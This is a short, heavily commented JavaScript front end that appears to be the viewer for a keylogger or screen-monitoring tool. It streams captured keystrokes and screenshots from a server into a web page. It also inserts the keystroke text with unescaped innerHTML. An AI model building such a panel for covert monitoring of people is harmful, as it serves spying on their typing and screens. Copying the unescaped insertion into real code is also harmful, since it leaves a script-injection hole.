// Establish a connection to the server using Socket.IO
const socket = io();

// Event listener for when the connection to the server is established
socket.on('connect', function() {
    console.log('Connected to server'); // Log to the console when connected
});

// Event listener for receiving a new keystroke event from the server
socket.on('new_keystroke', function(data) {
    const logDiv = document.getElementById('log'); // Get the log div element by its ID
    logDiv.innerHTML += `<p>${data.data}</p>`; // Append the new keystroke data inside a paragraph tag to the log div
    logDiv.scrollTop = logDiv.scrollHeight; // Scroll to the bottom of the log div to show the latest entry
});

// Event listener for receiving a new screenshot event from the server
socket.on('new_screenshot', function(data) {
    addScreenshot(data.filename); // Call the addScreenshot function with the filename received
});

// Add a click event listener to the button with ID 'fetch-screenshots'
document.getElementById('fetch-screenshots').addEventListener('click', function() {
    // Fetch the list of screenshots from the server
    fetch('/get_screenshots')
        .then(response => response.json()) // Parse the response as JSON
        .then(data => {
            const screenshotsDiv = document.getElementById('screenshots'); // Get the screenshots div element by its ID
            screenshotsDiv.innerHTML = ''; // Clear current screenshots in the div
            data.forEach(filename => { // Loop through each filename in the received data
                addScreenshot(filename); // Call the addScreenshot function for each filename
            });
        });
});

// Function to add a screenshot to the screenshots div
function addScreenshot(filename) {
    const screenshotsDiv = document.getElementById('screenshots'); // Get the screenshots div element by its ID
    const img = document.createElement('img'); // Create a new img element
    img.src = `/screenshots/${filename}`; // Set the source of the img element to the screenshot's URL
    img.alt = filename; // Set the alt text of the img element to the filename
    img.style.maxWidth = '200px'; // Set the maximum width of the img element to 200 pixels
    img.style.margin = '10px'; // Set the margin of the img element to 10 pixels
    screenshotsDiv.appendChild(img); // Append the img element to the screenshots div
}